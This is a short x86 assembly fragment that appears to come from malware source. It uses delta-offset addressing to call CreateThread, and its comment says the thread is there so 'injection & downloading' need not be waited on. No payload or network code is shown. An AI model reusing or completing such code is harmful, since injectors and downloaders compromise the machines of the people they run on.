; Create Thread to avoid waiting injection & downloading
PDELTA	ThreadId
push	0
push	ebp
PDELTA	threadProgram
push	0
push	0
call	[DELTA pCreateThread]

